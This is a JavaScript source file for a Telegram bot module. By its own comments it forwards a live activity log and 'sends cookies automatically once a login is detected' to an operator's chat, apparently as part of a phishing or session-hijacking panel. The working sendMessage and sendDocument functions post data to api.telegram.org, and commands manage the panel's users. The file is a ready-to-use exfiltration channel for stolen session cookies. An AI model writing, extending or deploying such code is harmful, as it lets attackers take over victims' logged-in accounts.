// Telegram bot integration — mirrors the live activity log, sends cookies
// automatically once a login is detected, and handles owner commands for
// user management (/users, /adduser, /removeuser).
// Entirely optional and best-effort: all exports here are silent no-ops
// when TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID aren't configured.

import { config } from './config.js';
import { listUsers, createUser, deleteUser } from './users.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  var body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {
    /* best-effort */
  }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch {
    /* best-effort */
  }
}

// One-off setup helper: finds the chat_id of whoever most recently messaged
// the bot, so the operator doesn't have to dig a numeric id out by hand.
export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

// ── Command handler ─────────────────────────────────────────────────────────

async function handleUpdate(upd) {
  const msg = upd.message;
  if (!msg?.text) return;

  // Only respond to the configured owner chat
  if (String(msg.chat?.id) !== String(config.telegramChatId)) return;

  const text = msg.text.trim();

  if (text === '/users' || text.startsWith('/users ')) {
    const users = await listUsers();
    if (users.length === 0) {
      await sendMessage('No panel users registered yet.\nUse /adduser <username> <password> to add one.');
    } else {
      const lines = users.map((u) => `• ${u.username}  (added: ${u.createdAt.slice(0, 10)})`);
      await sendMessage(`Panel users (${users.length}):\n${lines.join('\n')}`);
    }
    return;
  }

  if (text.startsWith('/adduser ')) {
    const args = text.slice(9).trim().split(/\s+/);
    if (args.length < 2) {
      await sendMessage('Usage: /adduser <username> <password>\nPassword must be at least 8 characters.');
      return;
    }
    const [username, ...pwParts] = args;
    const password = pwParts.join(' ');
    try {
      await createUser(username.toLowerCase(), password);
      await sendMessage(`✅ User "${username}" added to the panel.`);
    } catch (err) {
      await sendMessage(`❌ Error: ${err.message}`);
    }
    return;
  }

  if (text.startsWith('/removeuser ')) {
    const username = text.slice(12).trim();
    if (!username) { await sendMessage('Usage: /removeuser <username>'); return; }
    try {
      await deleteUser(username);
      await sendMessage(`✅ User "${username}" removed from the panel.`);
    } catch (err) {
      await sendMessage(`❌ Error: ${err.message}`);
    }
    return;
  }

  if (text === '/help' || text.startsWith('/help ')) {
    await sendMessage(
      'Panel user management commands:\n' +
      '/users — list all panel users\n' +
      '/adduser <username> <password> — add a panel user\n' +
      '/removeuser <username> — remove a panel user\n\n' +
      'Username rules: 1-32 chars, a-z 0-9 _ . -\n' +
      'Password: minimum 8 characters',
    );
  }
}

// ── Long-polling loop ────────────────────────────────────────────────────────

let pollingOffset = 0;

async function pollOnce() {
  if (!isEnabled()) return;
  try {
    const res = await fetch(
      apiUrl('getUpdates') + `?offset=${pollingOffset}&timeout=20&allowed_updates=["message"]`,
      { signal: AbortSignal.timeout(25_000) },
    );
    if (!res.ok) return;
    const data = await res.json();
    for (const upd of data.result || []) {
      pollingOffset = upd.update_id + 1;
      await handleUpdate(upd).catch(() => {});
    }
  } catch {
    /* network error — retry next tick */
  }
}

let _pollTimer = null;

export function startPolling() {
  if (!isEnabled() || _pollTimer) return;
  const loop = async () => {
    await pollOnce();
    _pollTimer = setTimeout(loop, 1000);
  };
  loop();
}

export function stopPolling() {
  if (_pollTimer) { clearTimeout(_pollTimer); _pollTimer = null; }
}
